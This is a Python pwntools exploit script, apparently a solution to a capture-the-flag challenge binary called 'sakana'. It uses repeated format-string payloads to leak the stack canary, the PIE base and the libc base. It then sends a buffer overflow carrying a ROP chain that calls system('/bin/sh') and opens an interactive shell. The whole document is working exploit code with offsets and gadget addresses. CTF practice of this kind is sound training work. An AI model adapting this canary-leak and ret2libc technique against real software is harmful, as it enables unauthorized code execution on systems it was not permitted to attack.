
from pwn import *

context.binary=ELF('pwn/sakana/sakana')

r=process('pwn/sakana/sakana')
output=r.recvuntil(b'~>')#stuff from banner

#the 1st payload finds canary
payload=flat([
    b'%X-'*(33+5+1)#33 is the number of words for char 264, and 5 is for the remaining registers. 1 is the canary.
])
r.sendline(b'printf')
r.sendline(payload)
output=r.recvuntil(b'~>')#stuff containing canary
#print(output)
_canary=output.decode().split('0x')[-1][:16]
#print('the canary is: 0x%s'%_canary)
_canary=int(_canary,16)
print('the canary is: 0x%x'%_canary)

#2nd payload finds the pie base
payload=flat([
    b'%X-'*(33+5+1+2)#33 is the number of words for char 264, and 5 is for the remaining registers. 1 is the canary.
    #and finally, we see that the return address to shell+37 is 2 words up
])
r.sendline(b'printf')
r.sendline(payload)
output=r.recvuntil(b'~>')
#print(output)
_shell_addr=output.decode().split('0x')[-1][:16]
#print('return address to shell+0x37: 0x%s'%_shell_addr)
_shell_addr=int(_shell_addr,16)
print('return address to shell+0x37: 0x%x'%_shell_addr)
pie_base=_shell_addr-0x17cc#this offet value is found with gdb
print('pie base: 0x%x'%pie_base)#verified with gdb



#3rd payload finds the __libc_start_main address
payload=flat([
        b'%X-'*(33+5+1+6)#33 is the number of words for char 264, and 5 is for the remaining registers. 1 is the canary.
    #and finally, we see that the return address to shell+37 is 2s words up
     ]
)
r.sendline(b'printf')
r.sendline(payload)
output=r.recvuntil(b'~>')
#print(output)
_libc_start_main=output.decode().split('0x')[-1][:16]
#print('return address to _libc_start_main+0x243: 0x%s'%_libc_start_main)
_libc_start_main=int(_libc_start_main,16)
print('return address to _libc_start_main+0x243: 0x%x'%_libc_start_main)
libc_base=_libc_start_main-0x24083#this offet value is found with gdb
print('updated libc address  0x%x'%libc_base)#verified with gdb

#4th payload gets the shell
#ldd pwn/sakana/sakana
#readelf -s  /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
system_addr = libc_base + 0x52290
bin_sh=libc_base+0x1b45bd#strings -a -t x pwn/sakana/libc-2.31.so | grep /bin/sh
offset=264#buffer size
_ret=0x101a+pie_base#found in binary by ropper
pop_rdi=0x00000000000023a3+pie_base#found in binary by ropper

payload=flat([
    b'a'*offset,
    _canary,
    b'a'*8,
    pop_rdi,
    bin_sh,
    _ret,
    system_addr
])
pause()
r.sendline(b'printf')
r.sendline(payload)
r.interactive()
